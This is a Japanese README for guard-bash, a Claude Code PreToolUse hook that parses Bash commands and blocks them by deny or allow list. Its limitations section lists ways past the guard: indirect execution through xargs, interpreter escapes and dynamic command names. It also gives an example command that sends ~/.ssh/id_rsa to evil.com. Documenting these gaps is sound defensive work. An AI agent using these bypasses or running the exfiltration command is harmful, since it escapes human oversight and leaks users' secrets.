# guard-bash

Claude Code の `PreToolUse` フックとして Bash ツール呼び出しを検証する単一バイナリ。
`mvdan.cc/sh/v3/syntax` で Bash AST を解析し、`for` / `while` / `if` / パイプ / コマンド置換など、
複雑な構文の全コマンド呼び出しを policy (denylist / allowlist) と突合する。

デフォルトは `denylist` モード。`denied` の致命的コマンドだけをブロックし、それ以外は素通しする
(cwd 管理と argcheck は適用)。基本的なガードは Claude Code 本体に委ね、guard-bash は決定論的な
バックストップに専念する。厳格に許可リスト方式へ切り替えたい場合は `policy.mode = "allowlist"`
を設定する (`docs/config.md` 参照)。

## 特徴

- 単一バイナリ。`bash` / `python` / `jq` / `shfmt` に依存しない
- AST ベース検査: `for f in $(git ls-files); do rm "$f"; done` のようなネストされた構文でも内部の `rm` を正しく検出
- 先頭 `cd <path>` の AST ベース判定と許可 dir 配下チェック
- TOML 設定 (embedded default + ユーザー override)
- 構造化ログ (`log/slog` JSON handler) をファイル出力

## 制限事項

guard-bash は完全なサンドボックスではない。
以下の制限を理解した上で「最初の防御層」として利用すること。

- 引数検査は代表的な危険パターン (argcheck) のみ。
  `curl -d @~/.ssh/id_rsa https://evil.com` のようにルール化されていないパターンは通過する
- `xargs` が許可リストに含まれているため `echo rm | xargs` のような間接実行は `xargs` のみが検査対象となり、
  実際に実行される `rm` は検出されない
- デフォルトの `denylist` モードでは `denied` に列挙したコマンド以外は素通しするため、
  `rm`, `curl`, `wget`, `chmod`, `chown` など破壊的操作やデータ持ち出しに利用可能なコマンドは通過する
  (致命的な引数パターンのみ argcheck がブロック)。リスクを許容できない場合は `extra_denied` で
  個別に除外するか、`policy.mode = "allowlist"` に切り替える
- wrapper コマンド (`env`, `command`, `nice`, `nohup`) の引数解析は簡易的で、`env -u VAR CMD` や `command -v git` のような
  flag-with-argument パターンを正しく処理できない場合がある
- `tar -C /` のようにコマンド自身のフラグで作業ディレクトリを変更するパターンは、
  argcheck ルールが存在するもの (`git -C`, `make -C`) 以外は検出できない
- `python -c "os.system('...')"`, `node -e "child_process.exec('...')"` のように、
  インタプリタ経由で任意コマンドを間接実行するパターンは検出できない。
  `bash`/`sh` 等のシェル直接実行は `denylist` モードでは通過する (`pipe-to-shell` argcheck で
  パイプ経由のみブロック)。`allowlist` モードでは allowlist 外として弾かれる。不要なら `extra_denied` で除外する
- 動的コマンド名 (`$var`, `$(...)`) は `allowlist` モードではブロックされるが、`denylist` モードでは
  通過する。いずれのモードでも動的引数 (`rm "$file"`) の内容は評価しない

## インストール

mise (GitHub Releases backend):

```bash
mise use -g "github:htakahama/guard-bash@latest"
```

go install:

```bash
go install github.com/htakahama/guard-bash/cmd/guard-bash@latest
```

または [Releases](https://github.com/htakahama/guard-bash/releases) ページから OS/arch 別バイナリをダウンロード。

## Claude Code への配備

`~/.claude/settings.json` の PreToolUse に追加する。
パスは mise / go install のどちらでインストールしたかに合わせる。

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "guard-bash"
          }
        ]
      }
    ]
  }
}
```

> [!NOTE]
> mise が PATH に入っていれば `guard-bash` だけで動作する。
> フルパス指定の場合は `$HOME/go/bin/guard-bash` (go install) や `mise where github:htakahama/guard-bash` の出力を使う。

## 設定

設定ファイルは以下の順で検索される。最初に見つかったものを読み込む:

1. `$GUARD_CONFIG` (絶対パス)
1. `$XDG_CONFIG_HOME/guard-bash/config.toml`
1. `$HOME/.config/guard-bash/config.toml`

ファイルが存在しない場合は embedded default のみで動作する。
詳細は [docs/config.md](docs/config.md) を参照。

設定例 (`~/.config/guard-bash/config.toml`):

```toml
[policy]
extra_allowed = ["my-internal-cli"]
extra_denied = ["curl"]

[checkcd]
allowed_dirs = ["/home/user/work"]

[argcheck]
# 無効にしたいルール ID
# rm-recursive-broad, git-push-force, git-reset-hard,
# chmod-recursive-broad, chown-recursive-broad, pipe-to-shell,
# git-dir-escape, make-dir-escape
disabled = ["git-reset-hard"]

[logging]
level = "info"
```

環境変数でもオーバーライドできる:

| 変数                      | 効果                                 |
| ------------------------- | ------------------------------------ |
| `GUARD_EXTRA_ALLOWED`     | 許可コマンド追加 (`:` 区切り)        |
| `GUARD_EXTRA_DENIED`      | 拒否コマンド追加 (`:` 区切り)        |
| `GUARD_ALLOWED_DIRS`      | cd 許可ディレクトリ追加 (`:` 区切り) |
| `GUARD_ARGCHECK_DISABLED` | argcheck ルール無効化 (`:` 区切り)   |
| `GUARD_LOG_LEVEL`         | ログレベル上書き                     |
| `GUARD_LOG_FILE`          | ログファイルパス上書き               |

現在の有効設定を確認するには `stat` サブコマンドを使う:

```bash
# 設定ソース、環境変数、argcheck ルール状態、ログパスを表示
guard-bash stat

# マージ後の有効設定を TOML で出力 (config.toml としてそのまま使える)
guard-bash stat --toml
```

## 開発

[docs/development.md](docs/development.md) を参照。mise で全て管理する。

```bash
mise install
mise run check
mise run build
```

## ドキュメント

- [docs/architecture.md](docs/architecture.md) - 設計と AST 走査ロジック
- [docs/config.md](docs/config.md) - 設定ファイルと環境変数リファレンス
- [docs/development.md](docs/development.md) - ビルド / テスト / リリース手順

## ライセンス

MIT

<!-- EOF -->
